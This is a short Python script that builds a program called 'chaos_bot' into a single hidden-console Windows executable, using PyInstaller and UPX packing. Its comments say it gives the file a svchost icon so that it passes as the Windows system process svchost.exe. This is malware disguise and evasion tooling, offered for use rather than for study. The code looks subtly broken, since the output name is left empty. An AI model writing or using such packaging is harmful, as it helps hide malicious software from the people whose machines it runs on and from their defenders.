import os
import shutil
from subprocess import run

# Compile with PyInstaller, UPX, and icon spoofing
def compile_bot():
    bot_file = "chaos_bot.py"
    icon_path = "svchost.ico"  # Spoof as svchost.exe (create or download a legit-looking icon)
    output_name = ""
    
    # Ensure UPX is installed and in PATH
    run([
        "pyinstaller",
        "--onefile",
        "--noconsole",
        f"--icon={icon_path}",
        "--upx-dir", "upx",  # Path to UPX directory
        "--distpath", "dist",
        "--workpath", "build",
        "--specpath", "spec",
        "-n", output_name,
        bot_file
    ], check=True)
    
    # Clean up
    shutil.rmtree("build", ignore_errors=True)
    shutil.rmtree("spec", ignore_errors=True)
    os.remove(f"{output_name}.spec")
    
    print(f"Compiled to dist/{output_name}")

if __name__ == "__main__":
    compile_bot()